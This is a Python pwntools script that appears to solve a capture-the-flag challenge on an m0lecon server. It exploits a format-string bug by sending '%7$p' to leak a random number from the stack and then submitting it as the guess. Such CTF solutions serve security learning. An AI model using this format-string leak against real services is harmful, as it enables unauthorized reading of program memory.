#!/usr/bin/env python3
import os
os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *

HOST = "svtctf.m0lecon.it" 
PORT = 13474


def main():
    server = remote(HOST, PORT)
    #server.interactive()
    server.recvuntil(b'First, what is your name:', timeout=1)

    server.sendline(b"%7$p")    #read 64-bit rand n on the stack

    server.recvuntil(b"Welcome:\n")
    number = server.recvline().decode().strip() #string
    #print("number(hex): " + number)
    number = int(number, 16)
    
    #print("number(dec):" + str(number))
    payload = str(number).encode()

    server.recvuntil(b"Now, guess the number:")
    print(f"Sending payload of length {len(payload)}")
    server.sendline(payload)

    # read remainder of program output
    server.interactive()

if __name__ == '__main__':
    main()
